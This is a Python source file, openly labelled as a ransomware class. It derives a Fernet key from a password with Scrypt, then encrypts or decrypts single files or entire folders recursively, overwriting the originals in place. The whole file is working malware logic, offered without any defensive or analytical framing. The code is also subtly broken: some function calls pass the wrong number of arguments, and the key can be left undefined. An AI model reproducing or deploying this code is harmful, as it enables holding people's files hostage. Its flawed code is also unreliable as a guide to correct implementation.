import pathlib
import secrets
import os
import base64
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

def generate_salt(size=16):
    """Generate the salt used for key derivation, 
    `size` is the length of the salt to generate"""
    return secrets.token_bytes(size)

def derive_key(salt, password):
    """Derive the key from the `password` using the passed `salt`"""
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())

def load_salt(path):
    # load salt from salt.salt file
    return open(path, "rb").read()

def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True, saltfile_path = "salt.salt"):
    """Generates a key from a `password` and the salt.
    If `load_existing_salt` is True, it'll load the salt from a file
    in the current directory called "salt.salt".
    If `save_salt` is True, then it will generate a new salt
    and save it to "salt.salt" """
    if load_existing_salt:
        # load existing salt
        salt = load_salt(saltfile_path)
    elif save_salt:
        # generate new salt and save it
        salt = generate_salt(salt_size)
        with open(saltfile_path, "wb") as salt_file:
            salt_file.write(salt)
    # generate the key from the salt and the password
    derived_key = derive_key(salt, password)
    # encode it using Base 64 and return it
    return base64.urlsafe_b64encode(derived_key)

def encrypt(filename, key):
    """Given a filename (str) and key (bytes), it encrypts the file and write it"""
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypted_data = f.encrypt(file_data)
    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def decrypt(filename, key):
    """Given a filename (str) and key (bytes), it decrypts the file and write it"""
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    try:
        decrypted_data = f.decrypt(encrypted_data)
    except cryptography.fernet.InvalidToken:
        print("[!] Invalid token, most likely the password is incorrect")
        return
    # write the original file
    with open(filename, "wb") as file:
        file.write(decrypted_data)

def encrypt_folder(foldername, key, debug):
    # if it's a folder, encrypt the entire folder (i.e all the containing files)
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            if debug:
                print(f"[*] Encrypting {child}")
            # encrypt the file
            encrypt(child, key)
        elif child.is_dir():
            # if it's a folder, encrypt the entire folder by calling this function recursively
            encrypt_folder(child, key)

def decrypt_folder(foldername, key, debug):
    # if it's a folder, decrypt the entire folder
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            if debug:
                print(f"[*] Decrypting {child}")
            # decrypt the file
            decrypt(child, key)
        elif child.is_dir():
            # if it's a folder, decrypt the entire folder by calling this function recursively
            decrypt_folder(child, key)

class ransomware:
    def decrypt(passw, path, debug=True, saltfile_path = "salt.salt"):
        password = passw
        # generate the key
        key = generate_key(password, load_existing_salt=True, saltfile_path=saltfile_path)
        if os.path.isfile(path):
            decrypt(path, key, debug)
        elif os.path.isdir(path):
            decrypt_folder(path, key, debug)
    def encrypt(passw,path, saltsize=32, debug=True, saltfile_path ="salt.salt"):
        password = passw
        # generate the key
        if saltsize != None:
            key = generate_key(password, salt_size=saltsize, save_salt=True, saltfile_path=saltfile_path)
        # get the encrypt and decrypt flags
        if os.path.isfile(path):
            # if it is a file, encrypt it
            encrypt(path, key, debug)
        elif os.path.isdir(path):
            encrypt_folder(path, key, debug)